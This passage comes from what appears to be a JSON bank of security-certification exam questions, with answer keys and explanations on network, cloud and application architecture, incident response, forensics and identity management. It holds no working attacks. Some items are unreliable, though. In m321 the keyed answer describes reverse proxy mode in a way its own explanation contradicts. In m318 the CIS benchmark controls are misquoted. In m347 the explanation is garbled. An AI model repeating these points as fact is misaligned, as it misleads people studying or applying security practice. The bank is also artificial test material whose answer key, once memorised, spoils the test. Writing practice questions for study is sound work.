        "VLAN hopping via double-tagging — an attacker on VLAN 10 sends frames with two 802.1Q tags; the outer tag (VLAN 10) is removed by the first switch, and the inner tag (VLAN 20) causes the frame to be forwarded to a different VLAN",
        "ARP poisoning — ARP replies redirected traffic across VLANs",
        "STP manipulation — spanning tree changes the network topology"
      ],
      "correct": 1,
      "exp": "Double-tagging VLAN hopping: an attacker on an access VLAN sends a frame with two 802.1Q tags. The first switch strips the outer tag (matching the native VLAN) and forwards the frame. The second switch sees the inner tag and delivers to the target VLAN — bypassing the inter-VLAN firewall. Mitigation: (1) Change the native VLAN to an unused VLAN (not VLAN 1). (2) Explicitly tag the native VLAN. (3) Use VLAN 1 for nothing. (4) Disable DTP on all access ports."
    },
    {
      "id": "m318",
      "ch": "3",
      "difficulty": "easy",
      "topic": "Cloud Security",
      "q": "An organisation's AWS environment has no MFA on the root account. A CIS AWS Foundations Benchmark assessment would rate this as:",
      "opts": [
        "Low risk — root account is rarely used",
        "Acceptable — IAM users with admin rights are equivalent to root",
        "A critical finding — the root account has unrestricted access and should be protected by MFA and its access keys should be deleted",
        "Medium risk — only relevant if the root account password is weak"
      ],
      "correct": 2,
      "exp": "The AWS root account has unrestricted access to everything in the account and cannot be restricted by IAM policies. Its compromise means complete account loss. CIS AWS Foundations Benchmark Control 1.4: \"Ensure access keys are rotated every 90 days\" and Control 1.5: \"Ensure MFA is enabled for the root account\" are critical (Level 1) requirements. Best practice: enable MFA, delete root access keys, and never use the root account for routine operations."
    },
    {
      "id": "m319",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Application Architecture",
      "q": "A developer wants to implement OAuth 2.0 for a single-page application (SPA) that calls an API. Which OAuth 2.0 flow is recommended for SPAs as of current best practice?",
      "opts": [
        "Client Credentials flow — suitable for applications without user interaction",
        "Resource Owner Password Credentials (ROPC) — directly collects user credentials in the app",
        "Implicit flow — previously recommended for SPAs, now deprecated",
        "Authorisation Code flow with PKCE (Proof Key for Code Exchange) — recommended for public clients that cannot store a client secret"
      ],
      "correct": 3,
      "exp": "Authorisation Code with PKCE is the current best practice for SPAs (and mobile apps) that cannot securely store a client secret. PKCE replaces the client secret with a code_verifier/code_challenge pair generated fresh for each request. The Implicit flow is deprecated (tokens exposed in URL fragments, no token refresh). ROPC requires the app to handle user credentials directly — anti-pattern. Client Credentials is for machine-to-machine, not user authentication."
    },
    {
      "id": "m320",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Network Architecture",
      "q": "A security architect designs an out-of-band (OOB) management network. What is the PRIMARY security purpose of separating management traffic from production traffic?",
      "opts": [
        "OOB networks are faster, reducing management latency",
        "Separating management traffic ensures that if the production network is compromised or unavailable, management access remains functional, and attackers on the production network cannot intercept or interfere with administrative credentials and commands",
        "OOB networks use stronger encryption than production networks by default",
        "OOB networks eliminate the need for MFA on management systems"
      ],
      "correct": 1,
      "exp": "OOB (Out-of-Band) management uses a physically or logically separate network path for administrative access (console access, iDRAC/iLO, IPMI, SSH management). Benefits: (1) Security: management credentials and traffic are isolated from the production network — an attacker on the production network cannot capture management credentials. (2) Availability: manage systems even when the production network is down or under attack. A standard baseline control for data centres."
    },
    {
      "id": "m321",
      "ch": "3",
      "difficulty": "hard",
      "topic": "Cloud Security",
      "q": "An organisation implements a Cloud Access Security Broker (CASB). Which CASB deployment mode inspects cloud traffic inline — between users and cloud services — allowing real-time blocking of policy violations?",
      "opts": [
        "API mode — integrates with cloud service APIs to scan data at rest",
        "Log collection mode — analyses cloud provider audit logs",
        "Reverse proxy mode — intercepts traffic from managed devices by routing them through the CASB before they reach the cloud service",
        "Email gateway mode — scans cloud email services"
      ],
      "correct": 2,
      "exp": "CASB deployment modes: (1) API mode: integrates with cloud provider APIs (Office 365, Google Workspace) — scans data at rest, discovers sharing policies, investigates historical events. Cannot block in real-time. (2) Forward proxy mode: device configured to route cloud traffic through CASB — real-time blocking. (3) Reverse proxy mode: cloud apps configured to route traffic through CASB — enforces controls without requiring device config, useful for BYOD. Real-time blocking capability distinguishes proxy modes from API mode."
    },
    {
      "id": "m322",
      "ch": "3",
      "difficulty": "easy",
      "topic": "Application Architecture",
      "q": "A software development team adopts DevSecOps practices. Which of the following BEST describes the \"shift left\" principle in this context?",
      "opts": [
        "Moving security operations from the right side of the organization chart to the left",
        "Integrating security testing and requirements into the earliest phases of the development process rather than treating security as a final gate before release",
        "Shifting security responsibilities from the security team to left-handed developers",
        "Moving security controls to the left side of the network topology"
      ],
      "correct": 1,
      "exp": "\"Shift left\" refers to moving activities earlier in the SDLC timeline (left on a Gantt chart). For security: rather than pen testing only before release, security is integrated from: requirements (threat modelling), design (security architecture review), coding (SAST in IDE), build (dependency scanning, secrets scanning), test (DAST, integration testing). Cost of fixing vulnerabilities increases 5-10x per SDLC phase — catching them in design is far cheaper than fixing in production."
    },
    {
      "id": "m323",
      "ch": "3",
      "difficulty": "easy",
      "topic": "Network Architecture",
      "q": "An organisation deploys a load balancer in front of three web servers. Which additional security benefit does a load balancer provide beyond distributing traffic?",
      "opts": [
        "Load balancers encrypt all database traffic",
        "A load balancer can perform SSL/TLS termination (offloading certificate management and decryption), DDoS mitigation through rate limiting, and health checks that prevent routing traffic to compromised or non-responsive servers",
        "Load balancers automatically patch web server vulnerabilities",
        "Load balancers provide web application firewall functionality by default"
      ],
      "correct": 1,
      "exp": "Load balancers provide: (1) SSL/TLS termination: handles certificate management and decryption centrally. (2) DDoS mitigation: rate limiting, connection limiting, IP reputation. (3) Health checks: removes unhealthy/compromised servers from rotation. (4) Layer 7 routing: can route based on content. Modern Application Load Balancers (ALBs) can integrate with WAF. They don't inherently provide WAF functionality but can be integrated with WAF services."
    },
    {
      "id": "m324",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Cloud Security",
      "q": "An organisation uses Kubernetes. A pod is able to access the Kubernetes API server and list all secrets in all namespaces. What misconfiguration allowed this?",
      "opts": [
        "The pod is using the default Docker network driver",
        "The pod's service account has overly permissive RBAC — likely a ClusterRole binding with cluster-wide secret read access, violating least privilege",
        "The Kubernetes namespace is incorrectly configured",
        "The pod is missing a security context"
      ],
      "correct": 1,
      "exp": "By default, Kubernetes service accounts can have broad API access if RBAC is misconfigured. Common misconfiguration: binding the \"cluster-admin\" ClusterRole or creating a ClusterRoleBinding that grants \"get/list\" on secrets cluster-wide to application service accounts. Fix: create a dedicated service account with a Role (namespace-scoped) granting only the specific resources and verbs needed. Never use cluster-admin for application pods. This is a critical Kubernetes security misconfiguration."
    },
    {
      "id": "m325",
      "ch": "3",
      "difficulty": "hard",
      "topic": "Application Architecture",
      "q": "A security audit finds that an application's REST API returns a 200 OK response for both valid and invalid API keys, with the difference only in the response body. Why is this a security concern?",
      "opts": [
        "REST APIs should use status codes other than 200",
        "HTTP status codes should convey authentication and authorisation outcomes — returning 200 for invalid credentials masks authentication failures, makes rate-limiting and monitoring harder, and is contrary to REST semantics (401 Unauthorized = not authenticated, 403 Forbidden = not authorised)",
        "The 200 response code exposes server version information",
        "REST APIs should not return body content for error responses"
      ],
      "correct": 1,
      "exp": "Proper HTTP status codes for authentication/authorisation: 401 Unauthorized: request lacks valid authentication. 403 Forbidden: authenticated but lacks permission. Using 200 for authentication failures: (1) Breaks client-side error handling. (2) Complicates SIEM alerting (can't filter on status codes). (3) Hides authentication failures from rate-limiting middleware. (4) Violates REST semantics. Security monitoring relies on HTTP 401/403 patterns to detect credential attacks."
    },
    {
      "id": "m326",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Network Architecture",
      "q": "A network engineer configures a Cisco switch with \"ip dhcp snooping\" and \"ip dhcp snooping trust\" on the uplink port only. What attack does this prevent?",
      "opts": [
        "ARP cache poisoning between hosts on the same VLAN",
        "Rogue DHCP server attacks — only the trusted uplink port can send DHCP offers and acknowledgements; DHCP responses from untrusted ports are dropped",
        "MAC address flooding of the switch's forwarding table",
        "VLAN hopping through native VLAN manipulation"
      ],
      "correct": 1,
      "exp": "DHCP Snooping marks switch ports as trusted or untrusted. Untrusted ports (access ports connected to end devices) can only send DHCP Discovery and Request messages — DHCP Offers and Acknowledgements from untrusted ports are dropped. This prevents a rogue DHCP server on an access port from assigning malicious gateways or DNS servers. The binding table created by DHCP Snooping is also used by DAI (Dynamic ARP Inspection) and IP Source Guard."
    },
    {
      "id": "m327",
      "ch": "3",
      "difficulty": "easy",
      "topic": "Cloud Security",
      "q": "An organisation needs to encrypt data at rest in a SaaS application but wants to maintain control of the encryption keys so the SaaS provider cannot access plaintext data. Which approach achieves this?",
      "opts": [
        "Trust the SaaS provider's built-in encryption — this always uses customer-specific keys",
        "Customer-managed encryption keys (CMEK) — the organisation manages keys in their own KMS or HSM, and data is encrypted/decrypted using those keys, preventing the SaaS provider from accessing plaintext",
        "Enable HTTPS on the SaaS application — this provides data-at-rest encryption",
        "Request a dedicated server instance from the SaaS provider"
      ],
      "correct": 1,
      "exp": "CMEK (Customer-Managed Encryption Keys): the customer controls the encryption keys in their own KMS (Key Management Service). The SaaS provider can encrypt/decrypt data only while the customer's key is accessible. If the customer revokes the key, the provider cannot decrypt the data. This is important for compliance scenarios (GDPR, HIPAA) where data access by the provider must be controlled. Contrast with provider-managed keys where the provider has full access."
    },
    {
      "id": "m328",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Application Architecture",
      "q": "A SAST tool reports \"Use of MD5 for password hashing\" in a code review. The developer argues that they add a salt, so it is secure. What is the CORRECT assessment?",
      "opts": [
        "The developer is correct — salted MD5 is secure for password hashing",
        "MD5 is cryptographically broken AND computationally too fast for password hashing. Even salted MD5 is vulnerable to GPU-accelerated brute force because MD5 can compute billions of hashes per second. Salting prevents rainbow tables but does not address the computational speed problem. Use bcrypt, scrypt, or Argon2.",
        "Salted MD5 is acceptable if the salt is longer than 32 bytes",
        "MD5 with a salt is equivalent to SHA-256 for this purpose"
      ],
      "correct": 1,
      "exp": "Password hashing requirements differ from regular hashing: (1) Slow by design: bcrypt, scrypt, Argon2 are intentionally slow — 100ms per hash vs MD5's ~100ns. (2) Memory-hard: Argon2 and scrypt require significant memory, defeating GPU parallelism. A salted MD5 hash of \"password123\" can be cracked on a modern GPU in microseconds by testing billions of combinations per second. The salt only prevents sharing precomputed tables — not brute force against an individual hash."
    },
    {
      "id": "m329",
      "ch": "3",
      "difficulty": "hard",
      "topic": "Network Architecture",
      "q": "A security engineer wants to implement mutual TLS (mTLS) between a mobile app and an API. The mobile app's certificate is pinned. An attacker intercepts traffic using a trusted corporate proxy. What will happen?",
      "opts": [
        "The proxy can decrypt and re-encrypt the traffic because TLS is transparent",
        "The mTLS connection will fail — the proxy presents a certificate signed by the corporate CA, but the mobile app's pinned certificate is the actual server certificate, not the proxy's; the pin mismatch causes connection failure",
        "The mobile app will automatically accept the proxy certificate",
        "mTLS prevents the proxy from intercepting but the app data is still visible"
      ],
      "correct": 1,
      "exp": "Certificate pinning causes the app to reject any certificate not matching the pinned value — even if signed by a trusted CA. The corporate proxy presents its own certificate (signed by the corporate CA, which is trusted by corporate devices), but the mobile app's pin is the actual API server certificate. The pin mismatch causes connection failure. This is why certificate pinning is used for high-security mobile apps but conflicts with corporate SSL inspection. mTLS also means the proxy cannot present a valid client certificate."
    },
    {
      "id": "m330",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Cloud Security",
      "q": "An organisation's cloud security posture management (CSPM) tool identifies: \"Lambda function has a role with administrator access.\" What is the recommended remediation?",
      "opts": [
        "Delete the Lambda function — Lambda should not have any IAM roles",
        "The Lambda function's execution role should be scoped to only the specific permissions the function needs (least privilege) — e.g., if it reads from S3 bucket X, grant only s3:GetObject on that specific bucket ARN",
        "Administrator access is acceptable for Lambda functions because they are serverless",
        "Enable VPC mode for the Lambda function to restrict its network access"
      ],
      "correct": 1,
      "exp": "Lambda execution roles follow the same least privilege principle as any IAM identity. An administrator role on a Lambda function means: if the function has a code injection vulnerability, an attacker can use the function's role to perform any AWS action in the account. Remediate by scoping the role to only required services, specific resource ARNs, and necessary actions. AWS recommends creating a unique execution role per Lambda function."
    },
    {
      "id": "m331",
      "ch": "4",
      "difficulty": "easy",
      "topic": "Security Monitoring",
      "q": "A SOC analyst receives an alert: \"Outbound connection to known malware C2 domain from FINANCE-PC-07.\" This alert has a 95% true positive rate for this rule. What should the analyst do FIRST?",
      "opts": [
        "Dismiss the alert — 5% false positive rate is acceptable for a busy SOC",
        "Begin reimaging FINANCE-PC-07 immediately without further investigation",
        "Verify the alert by corroborating with additional data sources (endpoint logs, DHCP, user identity) before taking action — confirm who is logged in, what processes initiated the connection, and whether the system shows other indicators of compromise",
        "Email the finance user asking if they noticed anything unusual"
      ],
      "correct": 2,
      "exp": "Even with a 95% true positive rate, good incident response requires: (1) Verification: confirm who was logged in, what process made the connection (EDR), check for other IoCs. (2) Scope assessment: is this isolated or part of broader compromise? (3) Then containment (isolate the system). Immediately reimaging without investigation destroys forensic evidence and misses understanding the full scope. \"Trust but verify\" — even high-confidence alerts deserve confirmation before destructive action."
    },
    {
      "id": "m332",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Security Monitoring",
      "q": "A SIEM correlation rule generates 800 alerts per day with a 99% false positive rate. This leaves only 8 real threats hidden among 792 false positives daily. What best describes the consequence and recommended action?",
      "opts": [
        "Accept the situation — some false positives are unavoidable",
        "Alert fatigue — analysts become desensitised and miss real threats; tune the rule by adding enrichment and context (business hours, asset criticality, allowlisted systems) and set a meaningful threshold to reduce noise while maintaining detection",
        "Disable the rule — a 99% FP rate means the rule is useless",
        "Add more analysts to review all 800 alerts"
      ],
      "correct": 1,
      "exp": "Alert fatigue is the #1 SOC effectiveness problem. With 99% FPR, analysts process hundreds of false positives for every real threat — leading to \"alert blindness\" where real threats are ignored or dismissed without proper investigation. Rule tuning: add context filters (exclude known scanners, exclude off-hours maintenance, add asset criticality weighting), implement allowlisting for documented legitimate behaviour, and set minimum thresholds. Quality over quantity."
    },
    {
      "id": "m333",
      "ch": "4",
      "difficulty": "hard",
      "topic": "Security Monitoring",
      "q": "A threat hunter creates the following hypothesis: \"APT actors targeting our sector commonly use PowerShell with encoded commands for initial execution after phishing.\" They query the SIEM for Event ID 4688 (process creation) where ParentImage contains \"outlook.exe\" and CommandLine contains \"-EncodedCommand\". This is an example of:",
      "opts": [
        "Reactive incident response — responding to an existing alert",
        "Signature-based detection — matching known malware signatures",
        "Hypothesis-driven threat hunting — proactively searching for attacker TTPs not yet generating alerts",
        "Vulnerability management — scanning for unpatched systems"
      ],
      "correct": 2,
      "exp": "Hypothesis-driven threat hunting: start with an intelligence-based hypothesis about attacker behaviour (PowerShell launched from Outlook with encoded commands = phishing → PowerShell dropper), then query historical data looking for evidence of this TTP. This finds threats that haven't triggered existing detection rules. The MITRE ATT&CK framework is often used to structure hunting hypotheses. This is proactive (before an alert fires) rather than reactive (after alert fires)."
    },
    {
      "id": "m334",
      "ch": "4",
      "difficulty": "easy",
      "topic": "Incident Response",
      "q": "During a ransomware incident, the incident response team identifies the affected systems and disconnects them from the network. Which NIST SP 800-61 phase does this represent?",
      "opts": [
        "Preparation — setting up IR capabilities before an incident",
        "Detection and Analysis — identifying the incident",
        "Containment — limiting the scope and impact of the incident",
        "Post-Incident Activity — documenting lessons learned"
      ],
      "correct": 2,
      "exp": "Containment is the phase where the IR team limits the spread and impact of the incident. Network disconnection prevents ransomware from spreading to additional systems and cuts off C2 communication. NIST SP 800-61 incident response lifecycle: Preparation → Detection & Analysis → Containment, Eradication & Recovery → Post-Incident Activity. Containment must balance stopping spread vs preserving forensic evidence (network disconnect is appropriate after evidence capture)."
    },
    {
      "id": "m335",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Incident Response",
      "q": "An incident response playbook for phishing attacks specifies that once a malicious email is confirmed, the security team should \"quarantine the email from all inboxes enterprise-wide.\" What tool or capability enables this action?",
      "opts": [
        "Endpoint detection and response (EDR) — remotely quarantines endpoint processes",
        "Email security gateway / SIEM integration with the email platform — allows bulk removal of an email by message ID from all mailboxes simultaneously",
        "Network firewall — blocks the sender's IP from sending additional emails",
        "Domain controller — disables the affected user's account"
      ],
      "correct": 1,
      "exp": "Modern email security platforms (Microsoft Defender for Office 365, Google Workspace Admin, Proofpoint) provide threat hunting and email quarantine capabilities allowing administrators to: search all mailboxes by sender, subject, URL, or attachment hash, and bulk-delete/quarantine matching emails. This removes the malicious email before other recipients can click it. This is a standard automated step in phishing response playbooks, often orchestrated by SOAR platforms."
    },
    {
      "id": "m336",
      "ch": "4",
      "difficulty": "hard",
      "topic": "Incident Response",
      "q": "An IR team discovers a compromised server that is actively communicating with a C2 server. Before isolating the server, what volatile forensic data should be captured FIRST?",
      "opts": [
        "A full disk image — this takes hours but captures all evidence",
        "The network configuration (IP, routing table) — static information available from logs",
        "RAM image (memory dump) — captures running processes, encryption keys, network connections, and injected code that will be lost when the system is isolated or shut down",
        "Configuration files and logs from disk — available after isolation"
      ],
      "correct": 2,
      "exp": "\"Order of volatility\" (RFC 3227): most volatile data disappears first. CPU registers → RAM → network state → running processes → disk. A RAM image captures: (1) Malware code running in memory. (2) Encryption keys (ransomware keys, TLS session keys). (3) Attacker commands typed in memory. (4) Network connections (active C2 channels). (5) Process injection evidence. After isolation, running processes end and RAM is cleared. Disk data persists. Capture RAM first."
    },
    {
      "id": "m337",
      "ch": "4",
      "difficulty": "easy",
      "topic": "Digital Forensics",
      "q": "A forensic investigator creates a forensic image of a hard drive. Before and after imaging, they compute SHA-256 hashes of both the original drive and the image. The hashes of original and image match; the hash of the original before and after imaging also match. What does this demonstrate?",
      "opts": [
        "The drive contains no malware",
        "The image is an exact bit-for-bit copy of the original, and the imaging process did not modify the original",
        "The drive is not encrypted",
        "The image is safe to delete the original"
      ],
      "correct": 1,
      "exp": "Forensic imaging integrity: (1) Original hash before and after matches: the imaging process did not modify the source (write blocker was effective). (2) Image hash matches original hash: the image is a bit-for-bit copy — no data was lost or altered. This hash verification is documented in the chain of custody and is required for evidence admissibility. SHA-256 is preferred over MD5 (which has collision vulnerabilities) for forensic verification."
    },
    {
      "id": "m338",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Digital Forensics",
      "q": "An investigator examines a Windows system and finds that the timestamps on several suspicious files were recently modified to appear older. What is this technique called and what forensic artefact can help detect it?",
      "opts": [
        "Anti-forensics through timestomping — the $STANDARD_INFORMATION attribute timestamps were modified; the $FILE_NAME attribute timestamps (updated only by the OS) can reveal the true original timestamps",
        "File deletion — files with modified timestamps have been deleted",
        "Encryption — the timestamps indicate when files were encrypted",
        "Compression — the timestamps changed when files were compressed"
      ],
      "correct": 0,
      "exp": "Timestomping (MITRE T1070.006): attackers use tools to modify file timestamps to blend in with legitimate files or appear to predate the intrusion. NTFS stores timestamps in TWO attributes: $STANDARD_INFORMATION: user-accessible, easily modified by user-space tools. $FILE_NAME: stored in the parent directory MFT record, only updated by the OS kernel — much harder to modify. Discrepancies between $SI and $FN timestamps indicate timestomping."
    },
    {
      "id": "m339",
      "ch": "4",
      "difficulty": "hard",
      "topic": "Digital Forensics",
      "q": "A forensic examiner uses a tool to extract the MFT ($MasterFileTable) from an NTFS volume. What forensic value does the MFT provide?",
      "opts": [
        "The MFT contains decryption keys for encrypted files on the volume",
        "The MFT contains a record for every file and directory on the NTFS volume — including filename, timestamps, file size, attributes, and pointers to data — and entries for deleted files may persist until overwritten, providing evidence of files that have been deleted",
        "The MFT contains system event logs",
        "The MFT contains user credentials cached on the system"
      ],
      "correct": 1,
      "exp": "The $MFT (Master File Table) is NTFS's central database — every file has a record containing: filename, timestamps (created, modified, accessed, entry modified), file size, attributes (hidden, read-only, encrypted), data cluster pointers. When a file is deleted, the MFT record is marked as available but may not be immediately overwritten — forensic tools can recover deleted file metadata. This is why forensic recovery of deleted files is possible on NTFS volumes."
    },
    {
      "id": "m340",
      "ch": "4",
      "difficulty": "easy",
      "topic": "Vulnerability Management",
      "q": "A penetration tester is hired and given the application's source code, architecture documentation, and access to all systems. What type of test is this?",
      "opts": [
        "Black-box test — no information provided to the tester",
        "Grey-box test — partial information provided",
        "White-box test — full information and access provided",
        "External test — conducted from outside the network"
      ],
      "correct": 2,
      "exp": "White-box testing (also called crystal-box or clear-box): the tester has full knowledge including source code, architecture diagrams, network maps, and system access. This allows thorough code review, logic flaw analysis, and efficient testing without time wasted on reconnaissance. Black-box: no prior knowledge, simulates external attacker. Grey-box: partial knowledge (e.g., user credentials, network diagrams but not source code)."
    },
    {
      "id": "m341",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Vulnerability Management",
      "q": "A vulnerability scanner finds a critical RCE vulnerability in a production web server. The development team says patching requires 4 weeks of testing. What should be implemented during those 4 weeks?",
      "opts": [
        "Accept the risk and wait for the patch — testing is necessary",
        "Implement compensating controls: deploy a WAF virtual patch rule targeting the specific vulnerability, restrict network access to the server where possible, and increase monitoring for exploitation attempts while the patch is prepared and tested",
        "Shut down the web server for 4 weeks",
        "Replace the web server with a different product immediately"
      ],
      "correct": 1,
      "exp": "When immediate patching is not feasible, compensating controls reduce risk during the patching window: (1) WAF virtual patch: a rule that blocks the specific exploit pattern for this CVE without changing application code. (2) Network restriction: limit source IPs that can reach the vulnerable service. (3) Enhanced monitoring: set up specific alerts for exploitation attempts. (4) Expedited testing: prioritise the patch in the testing queue. This is documented risk acceptance with compensating controls."
    },
    {
      "id": "m342",
      "ch": "4",
      "difficulty": "hard",
      "topic": "Vulnerability Management",
      "q": "A penetration tester successfully exploits a SQL injection vulnerability and retrieves a table of user password hashes. The tester runs hashcat against the hashes and recovers 70% of passwords within 2 hours. What does this finding indicate about the password storage implementation, beyond the SQLi vulnerability itself?",
      "opts": [
        "The password hashing algorithm is working correctly — some hashes cannot be cracked",
        "The passwords were hashed with a fast algorithm (likely MD5, SHA-1, or unsalted SHA-256) without a proper password hashing function; 70% cracked in 2 hours indicates trivially fast hash computation enabling GPU-based brute force",
        "The users chose weak passwords — the hashing is adequate",
        "The tester used a GPU cluster, which is an unfair advantage"
      ],
      "correct": 1,
      "exp": "70% crack rate in 2 hours indicates: (1) Fast hash function (MD5/SHA-1/SHA-256 can compute billions of hashes/second). (2) Likely no salt (or a common/static salt) — rainbow tables or identical hash-to-hash lookups possible. Proper password hashing (bcrypt cost factor 12, Argon2id) would make cracking a single password take seconds on a GPU — making batch cracking of a database infeasible. This is a compounding failure: SQLi + weak password hashing = mass credential compromise."
    },
    {
      "id": "m343",
      "ch": "4",
      "difficulty": "easy",
      "topic": "Identity Management",
      "q": "An organisation implements an Identity and Access Management (IAM) system that automatically provisions user access based on their HR job title when they join, and automatically deprovisions access when they leave. This automation is called:",
      "opts": [
        "Zero Trust identity — user access is re-verified continuously",
        "Identity lifecycle management / Joiner-Mover-Leaver (JML) process automation",
        "Role-Based Access Control (RBAC) — access is based on the role",
        "Multi-factor authentication provisioning"
      ],
      "correct": 1,
      "exp": "Joiner-Mover-Leaver (JML) automation: HR systems trigger IAM events. Joiner: new employee → provision role-appropriate access. Mover: role change → adjust access (deprovision old, provision new). Leaver: termination → immediately deprovision all access. Automated JML eliminates delays (access provisioned/deprovisioned within hours/minutes vs weeks), reduces privilege creep, and ensures consistency. Integration typically uses SCIM (System for Cross-domain Identity Management) between HR systems and IAM."
    },
    {
      "id": "m344",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Identity Management",
      "q": "An organisation implements Privileged Identity Management (PIM) in Microsoft Entra ID (formerly Azure AD). Administrators have their privileged roles assigned as \"Eligible\" rather than \"Active.\" What does this mean?",
      "opts": [
        "Eligible administrators have limited permissions compared to Active administrators",
        "Eligible assignment means the user can activate the privileged role on-demand for a time-limited period (e.g., 8 hours), requiring justification and optional MFA — they do not permanently have the elevated privileges",
        "Eligible administrators are still in training and need supervisor approval for all actions",
        "Eligible means the admin's account has been flagged for review"
      ],
      "correct": 1,
      "exp": "PIM Eligible assignment implements Just-In-Time (JIT) access. Administrators normally have standard user access. When elevated privileges are needed, they: (1) Navigate to PIM. (2) Activate the role with a justification and business reason. (3) Optionally complete MFA or require approval. (4) Role is active for a limited time (1-8 hours). This dramatically reduces the attack surface — persistent privileged accounts with 24/7 admin rights are high-value targets. JIT limits the window of exposure."
    },
    {
      "id": "m345",
      "ch": "4",
      "difficulty": "hard",
      "topic": "Identity Management",
      "q": "An organisation uses Active Directory. A service account named \"svc_sqlserver\" is a member of Domain Admins. A security reviewer flags this as a critical risk. Why?",
      "opts": [
        "Service accounts cannot be members of Domain Admins by technical limitation",
        "Service accounts typically have passwords that rarely change, cannot use MFA, and run continuously — a compromised Domain Admin service account provides persistent, privileged, unflagged access to the entire domain; the SQL Server service does not need Domain Admin rights",
        "Domain Admin membership is required for SQL Server to function correctly",
        "Service accounts should always be Domain Admins to ensure they can access all required resources"
      ],
      "correct": 1,
      "exp": "Service accounts with Domain Admin membership create extreme risk: (1) Never need it: SQL Server service accounts need only specific local permissions, not domain-wide admin. (2) Long-lived credentials: service account passwords change infrequently. (3) No MFA: service accounts authenticate programmatically. (4) Always running: continuous attack surface. Remediation: apply least privilege (specific local permissions), use Group Managed Service Accounts (gMSA) with automatic password rotation, and remove Domain Admin membership."
    },
    {
      "id": "m346",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Security Monitoring",
      "q": "A SIEM is configured to correlate events across multiple data sources. An analyst notices that a single source IP generated 500 authentication failures across 20 different usernames in 5 minutes, followed by 3 successful authentications. What attack does this correlation MOST likely represent?",
      "opts": [
        "A single-account brute force attack that eventually succeeded",
        "Password spraying that succeeded for 3 accounts — the 500 failures across 20 usernames indicate distributed horizontal brute force under the lockout threshold, with 3 accounts using weak or common passwords",
        "A legitimate helpdesk system performing bulk password resets",
        "A vulnerability scanner performing authentication testing"
      ],
      "correct": 1,
      "exp": "The pattern: many usernames + few attempts per username = password spraying. The attacker stayed under per-account lockout thresholds. 3 successes from 500 attempts = 0.6% success rate, consistent with spraying a common password against all accounts. SIEM correlation: EventID 4625 (failure) + count_distinct(TargetUserName) + success EventID 4624 = detection rule. Response: lock the 3 compromised accounts, reset passwords, investigate lateral movement from those accounts."
    },
    {
      "id": "m347",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Incident Response",
      "q": "An organisation's incident response plan defines RTO as 4 hours and RPO as 30 minutes for their order processing system. A ransomware attack encrypts all data at 2:00 PM. The most recent backup is from 1:45 PM. What conclusions can be drawn?",
      "opts": [
        "Both RTO and RPO will definitely be violated",
        "The RPO will be met — the 1:45 PM backup means only 15 minutes of data will be lost (within the 30-minute RPO). The RTO may or may not be met depending on how quickly systems can be restored from the backup.",
        "The RTO and RPO objectives are inherently impossible to meet",
        "Both RTO and RPO will be met automatically"
      ],
      "correct": 1,
      "exp": "RPO (Recovery Point Objective): maximum acceptable data loss. Attack at 2:00 PM, backup at 1:45 PM = 15 minutes of potential data loss. 15 RPO can be met. RTO (Recovery Time Objective): maximum acceptable downtime. 4-hour RTO means systems must be operational by 6:00 PM. Whether this is achievable depends on restoration time from backup — the scenario doesn't confirm it. RPO assessment is objective; RTO depends on execution."
    },
    {
      "id": "m348",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Digital Forensics",
      "q": "An analyst is examining a Windows system's prefetch files (in C:\\Windows\\Prefetch\\). What security-relevant information can these files provide?",
      "opts": [
        "Prefetch files contain the contents of deleted files",
        "Prefetch files record that specific executables were run, when they were last run, and how many times — providing evidence of program execution even if the executable has since been deleted",
        "Prefetch files contain network traffic captures",
        "Prefetch files record user login events"
      ],
      "correct": 1,
      "exp": "Windows Prefetch: Windows creates .pf files to speed up application launch by preloading components. Forensically valuable: (1) Execution evidence: if MALWARE.EXE.pf exists, malware.exe was executed (even if malware.exe was deleted). (2) Timestamps: last execution time, up to 8 run timestamps in Win8+. (3) Run count: how many times executed. (4) File references: DLLs and resources loaded during execution. Prefetch is enabled by default on workstations but often disabled on servers."
    },
    {
      "id": "m349",
      "ch": "4",
      "difficulty": "easy",
      "topic": "Vulnerability Management",
      "q": "A vulnerability assessment differs from a penetration test in what CRITICAL way?",
      "opts": [
        "Vulnerability assessments are always conducted externally; penetration tests are always internal",
        "Vulnerability assessments identify and rank vulnerabilities without exploiting them; penetration tests actively attempt to exploit vulnerabilities to demonstrate real-world attack impact",
        "Vulnerability assessments are manual; penetration tests use automated tools",
        "Vulnerability assessments are only performed on networks; penetration tests focus on applications"
      ],
      "correct": 1,
      "exp": "Vulnerability Assessment: systematic identification, classification, and reporting of vulnerabilities. Tools: Nessus, Qualys, OpenVAS. Output: list of vulnerabilities with severity ratings. Does NOT involve exploitation. Penetration Test: simulates a real attacker by attempting to exploit vulnerabilities, chain multiple vulnerabilities, move laterally, and achieve specific objectives (access sensitive data, domain admin). Shows real-world business impact. Pen tests require explicit written authorisation."
    },
    {
      "id": "m350",
      "ch": "4",
      "difficulty": "medium",
      "topic": "Identity Management",
      "q": "An organisation implements a Privileged Access Workstation (PAW) for domain administrator tasks. What is the PRIMARY security purpose of a PAW?",
      "opts": [
        "PAWs provide higher-resolution displays for administrative tasks",
        "PAWs are dedicated, hardened workstations used exclusively for privileged administrative tasks — they have internet browsing, email, and office applications removed, reducing the risk of admin credentials being compromised through phishing or malware on a multipurpose workstation",
        "PAWs are cheaper than regular workstations",
        "PAWs have higher CPU performance for running management tools"
      ],
      "correct": 1,
      "exp": "PAW (Privileged Access Workstation): a dedicated, locked-down device used ONLY for administrative tasks. It has: no email, no web browsing, no office applications, software whitelisting, hardware-based security (TPM, Secure Boot), minimal attack surface. Admins use their regular workstation for email/browsing and their PAW only for AD administration, server management, etc. This prevents credential theft through phishing — even if the regular workstation is compromised, admin credentials were never typed there."
    },
    {
      "id": "m351",
      "ch": "4",
      "difficulty": "hard",
      "topic": "Security Monitoring",
